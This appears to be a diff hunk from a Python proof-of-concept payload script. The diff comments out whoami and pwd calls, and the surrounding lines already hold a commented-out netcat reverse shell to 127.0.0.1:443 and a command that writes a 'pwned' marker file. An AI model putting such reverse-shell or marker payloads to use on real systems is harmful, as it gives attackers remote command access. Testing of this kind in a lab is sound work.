@@ -30,8 +30,8 @@ def run():
     for num in range(20):
         obj['childrenAgencies'].append("DOBLIUW")
     print("\n", obj)
-    subprocess.run('whoami')
-    subprocess.run('pwd')
+    #subprocess.run('whoami')
+    #subprocess.run('pwd')
     #print("Reverse shell")
     #proc = subprocess.Popen(['nc -e /bin/bash 127.0.0.1 443'], stdout=subprocess.PIPE, shell=True)
     #proc2 = subprocess.Popen(['mkdir dirDobliuwFromOwen; cd dirDobliuwFromOwen; echo "pwned" >  pwned '], stdout=subprocess.PIPE, shell=True)
